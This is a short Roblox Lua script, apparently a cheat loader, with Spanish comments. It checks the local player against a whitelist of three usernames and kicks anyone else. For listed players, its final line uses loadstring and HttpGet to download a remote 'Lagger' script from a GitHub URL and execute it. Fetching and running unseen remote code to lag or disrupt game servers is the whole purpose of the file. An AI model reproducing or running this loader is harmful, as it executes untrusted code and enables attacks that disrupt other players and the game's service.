-- 🔐 USUARIOS AUTORIZADOS
local authorizedUsers = {"PLATANITOOOOO79", "yazidXiter", "eliezer_blockspin991"}
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
if not localPlayer then return end
local isAuthorized = false
for _, u in ipairs(authorizedUsers) do if u == localPlayer.Name then isAuthorized = true break end end
if not isAuthorized then pcall(function() localPlayer:Kick("RESET HWID - No autorizado") end) return end

loadstring(game:HttpGet("https://raw.githubusercontent.com/hf423231-ops/Hugo.83k-/refs/heads/main/ZeyHubb_Lagger_FH2ONTOP_mini_lettres_partout.txt"))()